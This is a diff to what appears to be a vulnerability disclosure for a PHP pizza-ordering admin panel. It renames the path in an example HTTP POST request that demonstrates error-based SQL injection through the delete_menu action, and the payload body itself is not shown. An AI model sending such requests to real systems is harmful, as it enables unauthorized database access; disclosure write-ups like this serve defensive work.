@@ -58,7 +58,7 @@ function delete_menu(){
 Below is a **POST** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  
 
 ```
-POST /pizza/admin/ajax.php?action=delete_menu HTTP/1.1
+POST /pizzafy/admin/ajax.php?action=delete_menu HTTP/1.1
 Host: localhost
 Content-Length: 5
 sec-ch-ua: 
@@ -72,7 +72,7 @@ Origin: http://localhost
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: http://localhost/pizza/admin/index.php?page=menu
+Referer: http://localhost/pizzafy/admin/index.php?page=menu
 Accept-Encoding: gzip, deflate
 Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
 Cookie: PHPSESSID=fvkkm43h4pnc6r6khno620js83
